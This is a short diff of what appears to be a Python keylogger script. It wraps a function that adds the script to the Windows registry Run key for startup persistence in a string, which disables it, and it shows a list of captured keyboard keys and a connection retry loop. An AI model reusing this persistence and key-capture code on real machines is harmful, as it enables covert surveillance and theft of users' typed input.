@@ -13,7 +13,7 @@ while not connected:
         time.sleep(1)
 
 # Register to startup
-def register_startup():
+'''def register_startup():
     key = reg.HKEY_CURRENT_USER
     key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
     address=sys.argv[0]
@@ -25,7 +25,7 @@ def register_startup():
         reg.CloseKey(opena)
     except Exception:
         pass
-register_startup()
+register_startup()'''
 
 
 inneed_key = [Key.backspace, Key.caps_lock, Key.ctrl_l, Key.ctrl_r, Key.ctrl, Key.enter, Key.space]
